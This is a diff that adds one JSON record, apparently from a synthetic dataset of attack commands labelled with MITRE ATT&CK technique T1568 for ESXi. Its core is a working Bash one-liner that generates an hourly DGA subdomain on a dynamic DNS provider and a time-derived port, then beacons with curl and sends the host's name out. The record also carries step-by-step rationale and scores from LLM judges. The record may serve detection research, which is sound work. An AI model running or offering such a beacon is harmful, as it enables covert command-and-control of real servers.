@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1568",
+  "platform": "ESXi",
+  "shell": "Bash",
+  "command": "seed=$(date -u +%Y%m%d%H); sub=$(printf \"%s\" \"$seed\" | sha1sum | cut -c1-12); port=$(( (10#$(date -u +%H%M) % 20000) + 10000 )); dom=\"$sub.dynu.net\"; curl --connect-timeout 5 -A \"esxi-$(uname -r)\" \"https://$dom:$port/beacon?host=$(hostname -s)&t=$(date -u +%s)\"",
+  "explanation": "Generates a time-based DGA subdomain each hour and selects a dynamic port derived from the current UTC time before attempting an HTTPS beacon via curl. This leverages dynamic resolution to avoid static IoCs per ATT&CK T1568.",
+  "rationale_steps": [
+    "Derive a seed from the current UTC year-month-day-hour.",
+    "Hash the seed to produce a rotating subdomain for a dynamic DNS provider.",
+    "Compute a port from current UTC time to vary C2 parameters.",
+    "Beacon with curl to the dynamically generated domain and port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-0d44a1cb-22d4ddc6",
+  "source_prompt_hash": "0d44a1cb",
+  "timestamp_utc": "2025-09-30T04:15:38.906305Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with balanced quoting, valid command/arithmetic substitutions, proper separators, and correct option usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It algorithmically derives a time-based subdomain and port and attempts an HTTPS beacon, aligning with T1568 dynamic resolution, though success depends on tool availability on ESXi and the generated subdomain’s DNS/service existence.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T06:25:45.657667Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid semicolon separators, correct arithmetic expansion, proper flag usage for sha1sum/cut/curl, and no syntax errors.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1568 by generating a time-seeded DGA subdomain via SHA1 hashing of the UTC hour, computing a dynamic port from current time, and beaconing over HTTPS with a realistic ESXi-themed user-agent and host metadata, fully aligning with dynamic resolution C2 behavior.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2026-02-19T00:22:44.098130Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly formed with correct variable assignments, subshells, arithmetic expansions, and properly escaped/quoted strings.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a time-based DGA and dynamic port selection for a C2 beacon, aligning perfectly with the Dynamic Resolution technique.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2026-02-19T00:22:47.854067Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
